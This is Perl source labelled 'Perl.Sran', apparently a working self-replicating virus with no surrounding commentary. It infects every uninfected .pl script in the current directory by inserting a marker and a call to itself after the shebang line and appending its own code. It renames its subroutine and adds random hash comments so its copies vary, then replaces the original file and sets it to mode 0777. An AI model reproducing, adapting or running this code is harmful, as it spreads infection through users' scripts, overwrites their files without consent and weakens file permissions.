Perl.Sran

qwerty();#

sub qwerty {

a: while (<*.pl>)
    {
        my $oF = "qwerty";
        my $tN = "$ENV{\"HOME\"}/tmp/".crypt($_, $_), $oN = "./$_", $nF = crypt($_, $oF);   
            
        open (WE, "<$0");                                       
        open (IFILE, "<$_");
        open (TEMP, ">$tN");                                    
        
            while (<IFILE>) 
            {
                chomp;
                if (/\#!Sran/) { unlink ($tN); next a }         
                elsif (!/#!\//) { print TEMP "$_\n" }
                else { print TEMP "$_ #!Sran\n$nF();\n" }               
            }
            
            while (<WE>)
            {
                $st = "";
                
                s/#[0-9].*/$st/;
                if (/sub $oF/ || /my \$oF =/) { $cW = 1; s/$oF/$nF/}
                next if (/#!\/usr\/bin\/perl/ || /qwerty();#/ || !$cW);
                if (int(rand(2))) { $st=" #".crypt($_, rand(256)) }
                else {$st = ""}
                
                chomp;
                print TEMP "$_$st\n";
            }
        
        unlink ($oN);
        rename ($tN, $oN);
        chmod (0777, $oN);
    }
}

